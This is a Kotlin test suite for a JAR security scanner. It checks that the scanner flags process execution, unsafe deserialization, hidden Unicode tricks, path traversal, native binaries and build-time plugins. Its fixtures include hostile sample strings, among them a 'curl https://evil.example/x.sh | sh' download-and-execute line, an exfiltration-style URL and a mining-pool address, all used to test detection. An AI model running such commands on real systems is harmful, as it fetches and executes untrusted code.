/*
 * Copyright 2026 Davils
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.davils.kreate.inspection.scan

import com.davils.kreate.archive.zipOf
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.collections.shouldBeEmpty
import io.kotest.matchers.collections.shouldContain
import io.kotest.matchers.shouldBe

private fun rulesIn(vararg entries: Pair<String, ByteArray>): List<String> {
    val hits = JarScanner().scan(zipOf(*entries), "sample.jar")
    return hits.map { hit -> hit.rule }
}

class JarScannerTest : FunSpec({
    context("class files") {
        mapOf(
            "java/lang/ProcessBuilder" to ("start" to "PROCESS_EXECUTION"),
            "java/lang/Runtime" to ("exec" to "PROCESS_EXECUTION"),
            "java/lang/System" to ("loadLibrary" to "NATIVE_LIBRARY_LOAD"),
            "java/lang/ClassLoader" to ("defineClass" to "DYNAMIC_CLASS_DEFINITION"),
            "javax/script/ScriptEngine" to ("eval" to "SCRIPT_EVALUATION"),
            "javax/naming/InitialContext" to ("lookup" to "JNDI_LOOKUP"),
            "java/io/ObjectInputStream" to ("readObject" to "UNSAFE_DESERIALIZATION")
        ).forEach { (owner, call) ->
            test("notices ${call.first} of $owner") {
                rulesIn("Sample.class" to classCalling(owner, call.first)) shouldContain call.second
            }
        }

        test("leaves an ordinary call alone") {
            rulesIn("Sample.class" to classCalling("java/lang/String", "length")).shouldBeEmpty()
        }

        test("reads the strings of a class") {
            val miner = classCalling("java/lang/String", "length", "stratum+tcp://pool.example:3333")

            rulesIn("Sample.class" to miner) shouldContain "CRYPTO_MINING"
        }

        test("finds a pipe from a download into a shell") {
            val dropper = classCalling("java/lang/String", "length", "curl https://evil.example/x.sh | sh")

            rulesIn("Sample.class" to dropper) shouldContain "DOWNLOAD_AND_EXECUTE"
        }

        test("names the host of an address") {
            val code = classCalling("java/lang/String", "length", "https://evil.example/collect")

            val hits = JarScanner().scan(zipOf("Sample.class" to code), "sample.jar")

            val hit = hits.single()
            hit.rule shouldBe "HARDCODED_URL"
            hit.detail shouldBe "evil.example"
        }

        test("reports a class it cannot read instead of failing") {
            val truncated = byteArrayOf(0xCA.toByte(), 0xFE.toByte(), 0xBA.toByte(), 0xBE.toByte(), 1, 2)

            rulesIn("Broken.class" to truncated) shouldContain "MALFORMED_CLASS"
        }

        test("does not take the magic number of a class for a native binary") {
            val rules = rulesIn("Sample.class" to classCalling("java/lang/String", "length"))

            rules.contains("NATIVE_BINARY") shouldBe false
        }

        test("ignores invisible characters in class constants, where they deceive nobody") {
            val table = classCalling("java/lang/String", "length", "‮​")

            rulesIn("Sample.class" to table).shouldBeEmpty()
        }
    }

    context("text resources") {
        test("find a hidden direction change") {
            rulesIn("config.properties" to "key=a‮b".toByteArray()) shouldContain "BIDI_OVERRIDE"
        }

        test("find a Cyrillic letter in a Latin word") {
            rulesIn("config.properties" to "pаssword=1".toByteArray()) shouldContain "HOMOGLYPH"
        }

        test("find a tag character") {
            val hidden = String(Character.toChars(0xE0041))

            rulesIn("notes.txt" to hidden.toByteArray()) shouldContain "TAG_CHARACTER"
        }

        test("accept a byte order mark at the start") {
            rulesIn("notes.txt" to "﻿plain".toByteArray()).shouldBeEmpty()
        }

        test("reject a byte order mark in the middle") {
            rulesIn("notes.txt" to "pl﻿ain".toByteArray()) shouldContain "ZERO_WIDTH"
        }
    }

    context("the archive") {
        test("rejects an entry that escapes it") {
            rulesIn("../../evil.sh" to "x".toByteArray()) shouldContain "PATH_TRAVERSAL"
        }

        test("rejects an absolute entry") {
            rulesIn("/etc/evil" to "x".toByteArray()) shouldContain "ABSOLUTE_PATH"
        }

        test("notices a case collision") {
            rulesIn("A.txt" to "x".toByteArray(), "a.txt" to "y".toByteArray()) shouldContain "CASE_COLLISION"
        }

        test("notices a hidden script") {
            rulesIn(".payload.sh" to "x".toByteArray()) shouldContain "HIDDEN_EXECUTABLE"
        }

        test("notices a native binary by its magic number") {
            val elf = byteArrayOf(0x7F, 0x45, 0x4C, 0x46, 1, 1)

            rulesIn("data.bin" to elf) shouldContain "NATIVE_BINARY"
        }

        test("looks into a nested archive") {
            val inner = zipOf("Sample.class" to classCalling("java/lang/ProcessBuilder", "start"))

            val rules = rulesIn("BOOT-INF/lib/inner.jar" to inner)

            rules shouldContain "NESTED_ARCHIVE"
            rules shouldContain "PROCESS_EXECUTION"
        }

        test("reports what is not an archive instead of failing") {
            val hits = JarScanner().scan("not a zip".toByteArray(), "broken.jar")

            hits.single().rule shouldBe "MALFORMED_ARCHIVE"
        }
    }

    context("code that runs at build time") {
        test("notices an annotation processor") {
            val service = "META-INF/services/javax.annotation.processing.Processor"

            rulesIn(service to "x.Processor".toByteArray()) shouldContain "ANNOTATION_PROCESSOR"
        }

        test("notices a Kotlin compiler plugin") {
            val service = "META-INF/services/org.jetbrains.kotlin.compiler.plugin.CompilerPluginRegistrar"

            rulesIn(service to "x.Plugin".toByteArray()) shouldContain "COMPILER_PLUGIN"
        }

        test("notices a Gradle plugin") {
            rulesIn("META-INF/gradle-plugins/x.properties" to "a=b".toByteArray()) shouldContain
                "GRADLE_PLUGIN_DESCRIPTOR"
        }

        test("notices a Java agent and a manifest class path") {
            val manifest = "Manifest-Version: 1.0\nPremain-Class: x.Agent\nClass-Path: evil.jar\n\n"

            val rules = rulesIn("META-INF/MANIFEST.MF" to manifest.toByteArray())

            rules shouldContain "JAVA_AGENT"
            rules shouldContain "MANIFEST_CLASS_PATH"
        }

        test("notices a class in a platform package") {
            rulesIn("java/lang/String.class" to classCalling("java/lang/String", "length")) shouldContain
                "SHADOWED_PLATFORM_CLASS"
        }
    }

    context("the size of a report") {
        test("survives a round trip") {
            val hits = listOf(Hit("A_RULE", "a.class", "detail"), Hit("B_RULE", "b.class"))

            HitsJson.parse(HitsJson.render(hits)) shouldBe hits
        }
    }
})
